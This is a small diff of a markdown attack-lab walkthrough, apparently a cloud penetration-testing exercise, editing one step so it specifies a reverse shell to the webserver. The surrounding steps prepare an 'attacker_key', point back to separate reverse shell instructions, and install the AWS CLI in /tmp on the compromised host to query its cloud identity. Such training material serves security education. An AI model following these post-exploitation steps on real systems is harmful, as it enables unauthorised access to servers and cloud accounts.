@@ -24,7 +24,7 @@ chmod 0600 attacker_key*
 ```bash
 cat attacker_key.pub
 ```
-4. Ensure your reverse shell is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
+4. Ensure your reverse shell to the webserver is still active. You can re-run the reverse shell commands from [2-Reverse-Shell.md](2-Reverse-Shell.md) if needed.
 5. Run the following commands to install the AWS CLI (note we're using the tmp directory which is writeable):
 ```bash
 curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "/tmp/awscliv2.zip" && unzip /tmp/awscliv2.zip -d /tmp/aws && cd /tmp/aws && ./aws/install --install-dir /tmp/aws-cli --bin-dir /tmp/aws-cli-bin && /tmp/aws-cli-bin/aws sts get-caller-identity
